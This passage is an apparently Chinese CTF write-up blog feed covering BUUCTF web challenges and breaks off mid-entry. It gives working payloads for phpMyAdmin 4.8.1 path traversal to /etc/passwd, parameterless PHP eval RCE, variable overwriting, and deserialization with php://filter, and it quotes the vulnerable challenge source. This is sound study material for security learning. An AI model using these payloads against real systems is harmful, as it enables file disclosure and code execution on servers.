      <url>/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E9%A2%98/%5BGWCTF%202019%5D%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p>dirb扫描到后台有phpmyadmin目录，访问一下</p><p>版本为4.81，经查询，存在远程文件读取漏洞</p><p>直接上payload读取passwd文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>读取成功，尝试读取flag文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[GXYCTF2019]禁止套娃</title>
      <link href="/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/php%E5%AE%A1%E8%AE%A1/%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/"/>
      <url>/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/php%E5%AE%A1%E8%AE%A1/%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>无参数RCE</p><p>什么都看不到，先扫一下目录</p><p>发现.git 目录 是git泄露</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>读下代码</p><p>第一个if php伪协议用不了 第二个if (?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数 第三个if et info等函数也用不了 典型的无参数rce 简单来说 我们需要用全局变量来rce</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>以一般的思路来说 肯定是要先scandir的 没有scandir没办法往下做 但是问题是scandir需要一个目录 而如果扫描当前目录的话需要一个”.” 第一部的预想就是要构造一个”.”<br><a href="https://www.w3school.com.cn/php/func_string_localeconv.asp">localeconv()</a><br>既然是数组 可以用current()  <code>函数默认截取第一个</code></p><p>即得 ?exp=print_r(scandir(current(localeconv())))</p><p>现在我们只是拿到了这个数组的键值 还没有拿到这个数组对应flag键值的具体值</p><p><a href="https://www.runoob.com/php/func-array-flip.html">array_flip()</a><br>这个函数就可以得到键值 flag.php</p><p>只能通过highlight_file或者show_source flag.php的方法 简单来说就是要一个单独的flag.php这个倒数第二个值</p><p><a href="https://www.w3school.com.cn/php/func_array_rand.asp">array_rand()</a><br>简单来说这个函数可以随机返回一个数组里的值 </p><p>payload</p><p><code>?exp=show_scoure(array_rand(array_flip(scandir(current(localconv())))))</code>;</p><p>或者</p><p><code>?exp=print_r(highlight_file(array_rand(array_flip(scandir(current(localconv()))))));</code></p><p>array_reverse() 简单来说就是逆序输出数组 但是我们的那个flag在倒数第二个 所以我们还需要一个next() 顾名思义 输出下一个</p><p>payload</p><p><code>?exp=print_r(highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p><p>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。<br>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>session_id()可以获取到当前的session id。</p><p>因此我们手动设置名为PHPSESSID的cookie，并设置值为flag.php</p><p>payload</p><p><code>?exp=show_source(session_id(session_start()));</code></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020网鼎杯朱雀组_PHPweb</title>
      <link href="/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/php%E5%AE%A1%E8%AE%A1/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84_PHPweb/"/>
      <url>/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/php%E5%AE%A1%E8%AE%A1/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84_PHPweb/</url>
      
        <content type="html"><![CDATA[<h1 id="未完成"><a href="#未完成" class="headerlink" title="未完成"></a>未完成</h1><p>hakcbar看到这个</p><p>func=date&amp;p=Y-m-d+h%3Ai%3As+a</p><p>data是个函数</p><p>应该是代码注入</p><p>func=eval&amp;p=phpinfo()</p><p>结果是hacker</p><p>看看源码</p><p>file_get_contents()</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BJDCTF2020]Mark loves cat</title>
      <link href="/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/php%E5%AE%A1%E8%AE%A1/%5BBJDCTF2020%5DMark%20loves%20cat/"/>
      <url>/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/php%E5%AE%A1%E8%AE%A1/%5BBJDCTF2020%5DMark%20loves%20cat/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>.git泄露</li><li>变量覆盖漏洞</li></ul><p>进网站什么都找不到，扫一下目录</p><p>发现是.git源码泄露</p><p>用githack下载查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag.php</span></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>可以发现代码中有变量覆盖漏洞</p><p>通过观察发现没有办法绕过到达最后的echo 出flag</p><p>但exit也可以打印没有打印$flag 我们可以变量覆盖</p><h3 id="观察第一个exit"><a href="#观察第一个exit" class="headerlink" title="观察第一个exit"></a>观察第一个exit</h3><p>GET参数中flag的值强等于某个变量($x)而且这个变量强不等于flag</p><p>即要存在又不能存在，不可能</p><h3 id="观察第二个exit"><a href="#观察第二个exit" class="headerlink" title="观察第二个exit"></a>观察第二个exit</h3><p>不存在post或get型的flag参数</p><p>我们想要通过单纯的post参数搞定它是不可能的，因为post处的变量覆盖是让它变成我们可控的值，所以不能</p><p>我们可以通过单纯的get或者get+post搞定</p><p>get传参 yds=flag；</p><h3 id="观察第三个exit"><a href="#观察第三个exit" class="headerlink" title="观察第三个exit"></a>观察第三个exit</h3><p>post型的flag强等于flag 或者get型的flag强等于flag</p><p>那我们就先从post型flag=flag开始：</p><p>我们post的数据，会在这一步，把原来的$flag的值改变，因为$x=flag,$y=flag，然后带进去变成了$flag=flag，原来的flag值没了，这条路不通：</p><p>我们试试get型的flag=flag：<br>is=flag&amp;flag=flag）</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2020 青龙组]AreUSerialz</title>
      <link href="/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/php%E5%AE%A1%E8%AE%A1/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz/"/>
      <url>/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/php%E5%AE%A1%E8%AE%A1/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="comment">// $this-&gt;process();</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// $this-&gt;process();</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$B</span>=serialize(<span class="variable">$A</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$B</span>;</span><br></pre></td></tr></table></figure><p>接着使用file_get_contents函数读取文件，我们此处借助php://filter伪协议读取文件</p><p>$op,$filename,$content三个变量权限都是protected，而protected权限的变量在序列化的时会有%00*%00字符，%00字符的ASCII码为0，就无法通过上面的is_valid函数校验。</p><p> 在这里有几种绕过的方式，简单的一种是：php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span> = <span class="string">&quot;A&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>payload</p><p>str=O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:57:”php://filter/read=convert.base64-encode/resource=flag.php”;s:7:”content”;s:1:”A”;}</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php魔法函数</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/php%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/php%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h1><p>PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. __construct() <span class="comment">#类的构造函数</span></span><br><span class="line"><span class="number">2</span>. __destruct() <span class="comment">#类的析构函数</span></span><br><span class="line"><span class="number">3</span>. __call()<span class="comment">#在对象中调用一个不可访问方法时调用</span></span><br><span class="line"><span class="number">4</span>. __callStatic()<span class="comment">#用静态方式中调用一个不可访问方法时调用</span></span><br><span class="line"><span class="number">5</span>. __get()<span class="comment">#获得一个类的成员变量时调用</span></span><br><span class="line"><span class="number">6</span>. __set()<span class="comment">#设置一个类的成员变量时调用</span></span><br><span class="line"><span class="number">7</span>. __isset()<span class="comment">#当对不可访问属性调用isset()或empty()时调用</span></span><br><span class="line"><span class="number">8</span>. __unset()<span class="comment">#当对不可访问属性调用unset()时被调用。</span></span><br><span class="line"><span class="number">9</span>. __sleep()<span class="comment">#执行serialize()时，先会调用这个函数</span></span><br><span class="line"><span class="number">10</span>. __wakeup()<span class="comment">#执行unserialize()时，先会调用这个函数</span></span><br><span class="line"><span class="number">11</span>. __toString()<span class="comment">#类被当成字符串时的回应方法</span></span><br><span class="line"><span class="number">12</span>. __invoke()<span class="comment">#当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</span></span><br><span class="line"><span class="number">13</span>. __set_state()<span class="comment">#调用var_export()导出类时，此静态方法会被调用。</span></span><br><span class="line"><span class="number">14</span>. __clone()<span class="comment">#当对象复制完成时调用</span></span><br><span class="line"><span class="number">15</span>. __autoload()<span class="comment">#尝试加载未定义的类</span></span><br><span class="line"><span class="number">16</span>. __debugInfo()<span class="comment">#打印所需调试信息</span></span><br></pre></td></tr></table></figure><p>调用的顺序为： 构造方法 =&gt; set方法. =&gt; get方法 =&gt; isset方法 =&gt; unset方法 =&gt; isset方法 =&gt; 析构方法</p><p>__set()和__get()，刚刚是访问不存在或者不可访问属性时候进行的调用。__call()   __callStatic()  是访问不存在或者不可访问的方法时候</p><p>__sleep()   __wakeup()   __toString()</p><p>serialize会先调用sleep函数 unserialize会先调用wakeup函数</p><p>tostring当需要输出得到对象名称时候会调用</p><h2 id="序列化public-private-protect参数产生不同结果"><a href="#序列化public-private-protect参数产生不同结果" class="headerlink" title="序列化public private protect参数产生不同结果"></a>序列化public private protect参数产生不同结果</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="number">2</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="number">3</span>     <span class="keyword">private</span> <span class="variable">$test1</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="number">4</span>     <span class="keyword">public</span> <span class="variable">$test2</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="number">5</span>     <span class="keyword">protected</span> <span class="variable">$test3</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="number">6</span> &#125;</span><br><span class="line"><span class="number">7</span> <span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="number">8</span> <span class="keyword">echo</span> serialize(<span class="variable">$test</span>);  <span class="comment">//  O:4:&quot;test&quot;:3:&#123;s:11:&quot; test test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot; * test3&quot;;s:5:&quot;hello&quot;;&#125;</span></span><br><span class="line"><span class="number">9</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>test类定义了三个不同类型(私有，公有，保护)但是值相同的字符串，序列化输出的值不相同 O:4:”test”:3:{s:11:” test test1”;s:5:”hello”;s:5:”test2”;s:5:”hello”;s:8:” * test3”;s:5:”hello”;}</p><p>通过对网页抓取输出是这样的 O:4:”test”:3:{s:11:”\00test\00test1”;s:5:”hello”;s:5:”test2”;s:5:”hello”;s:8:”\00*\00test3”;s:5:”hello”;}</p><p>private的参数被反序列化后变成 \00test\00test1 public的参数变成 test2  protected的参数变成 \00*\00test3 </p><h1 id="php反序列化字符逃逸"><a href="#php反序列化字符逃逸" class="headerlink" title="php反序列化字符逃逸"></a>php反序列化字符逃逸</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eg:</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;a:2:&#123;i:0;s:8:&quot;Hed9eh0g&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;abc&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$str</span>));</span><br><span class="line"><span class="comment">#仍然可以输出上面的结果，这说明反序列化的过程是有一定识别范围的，在这个范围之外的字符(第二个例子里的abc)都会被忽略，不影响反序列化的正常进行。</span></span><br></pre></td></tr></table></figure><h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 